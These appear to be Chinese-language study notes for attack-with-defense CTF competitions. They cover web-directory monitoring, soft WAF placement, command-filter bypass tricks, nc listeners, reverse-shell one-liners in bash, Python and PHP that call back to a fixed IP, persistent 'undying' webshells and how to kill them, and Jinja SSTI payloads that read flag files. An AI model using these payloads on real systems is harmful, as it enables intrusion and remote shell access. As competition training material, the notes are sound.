    - 不影响功能与页面的情况下进行注释。
    - 设置黑名单进行限制。


## 防御阶段

1. 做好web目录的文件监控
    https://github.com/leohearts/awd-watchbird

2. 部署软waf
    https://github.com/leohearts/awd-watchbird
    https://github.com/DasSecurity-HatLab/AoiAWD
    使用方法是：在需要防护的页面添加require_once('waf.php');或者在公共页面中调用。
    常用php系统添加waf
    | 系统 | 添加waf位置 |
    |:------|:------|
    | PHPCMS v9   | /phpcms/base.php |
    | PHPWIND8.7  | /data/sql_config.php |
    | DEDECMS5.7  | /data/common.inc.php |
    | DiscuzX2    | /config/config_global.php |
    | Wordpress   | /wp-config.php |
    | MetInfo     | /include/head.php |

3. 做好OS防护
    ```shell
    whoami == w'h'o'a'm"i"  # 单引号双引号连接符，需要闭合
    whoami == a=who&&b=ami&&$a$b # 变量拼接
    cat /etc/passwd == cat /?t?/??ss**  # 通配符匹配
    ```

## 攻击阶段

信息收集 → 攻击端口 → web攻击 → 权限维持 → 批量刷分

权限维持，攻击机应该先执行nc监听
```shell
nc -lvp 9999  # 监听TCP端口
nc -lk 9999   # 保持监听TCP端口
nc -lu 9999   # 监听UDP
```

以下举例几个版本的反弹shell，可以用浏览器的HackTools插件生成反弹shell。

- bash版本
  ```shell
  bash -i >& /dev/tcp/192.168.1.126/9999 0>&1
  ```

- python版本
  ```python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.126",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
  ```

- php版本
  ```php
  php -r '$sock=fsockopen("192.168.1.126", 9999);exec("/bin/sh -i <&3 2>&3");'
  ```

### 不死马

上传bsm.php后，访问bsm.php，使之生效。针对不死马查杀。

1. 找到不死马的PID，杀进程。

2. 用bash不断的删除文件。
    ```shell
    #!/bin/bash
    i=./.ma.php
    while true
    do
      rm -rf $i;
      sleep 0.01;
    done
    ```

3. 不断的删除程序和杀进程(需要kill权限)。
    ```php
    <?php
      while (1){
        $pid=xxx;
        @unlink('.ma.php);
        exec('kill -9 $pid");
      }
    ?>
    ```


## 工具 
ONE-FOX集成工具箱
XTerminal
Yakit


# SSTI模板注入

?name={%print([].__class__.__base__.__subclasses__()[132].__enter__.__globals__["pop"+"en"]("cat%20/flag").read())%}
 __subclasses__()[132]是os._wrap_close类，在第132个。这个类有popen方法，需要先使用__enter__方法再调用__globals__可以获取方法内以字典的形式返回的方法、属性等值。

 ssti payload：
{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'}
